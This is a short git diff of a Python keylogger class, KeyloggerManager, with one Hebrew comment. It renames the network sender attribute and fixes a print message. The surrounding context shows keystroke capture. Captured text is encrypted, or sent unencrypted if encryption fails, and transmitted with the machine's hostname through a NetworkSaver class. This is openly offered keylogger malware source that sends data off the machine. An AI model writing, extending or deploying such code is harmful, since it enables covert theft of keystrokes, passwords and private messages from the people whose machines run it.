@@ -14,7 +14,7 @@ class KeyloggerManager:
         self.keylogger_listener = ListenerKeyboard()       # נוצרים אוטומטית מופעים של ListenerKeyboard() וFileWriter()/ NetworkWriter()
         self.buffer = {}
         self.key = key
-        self.to_send = NetworkSaver()
+        self.writer = NetworkSaver()
         self.machine_name = socket.gethostname()
         self.copied = False
         self.running = False
@@ -67,12 +67,12 @@ class KeyloggerManager:
                 try:
                     encrypting_text = Encryption(text,self.key)
                     encrypted_text = encrypting_text.encrypt_text()
-                    self.to_send.send_data(encrypted_text,self.machine_name)
-                    print("send succesfully")
+                    self.writer.send_data(encrypted_text,self.machine_name)
+                    print("sent succesfully")
 
                 except:
-                    self.to_send.send_data(text, self.machine_name)
-                    print("send succesfully")
+                    self.writer.send_data(text, self.machine_name)
+                    print("sent succesfully")
 
 
         if self.buffer:
@@ -85,11 +85,11 @@ class KeyloggerManager:
             try:
                 encrypting_text = Encryption(text, self.key)
                 encrypted_text = encrypting_text.encrypt_text()
-                self.to_send.send_data(encrypted_text, f"{self.machine_name}")
-                print("send succesfully")
+                self.writer.send_data(encrypted_text, f"{self.machine_name}")
+                print("sent succesfully")
             except:
-                self.to_send.send_data(text, f"{self.machine_name}")
-                print("send succesfully")
+                self.writer.send_data(text, f"{self.machine_name}")
+                print("sent succesfully")
 
 
 
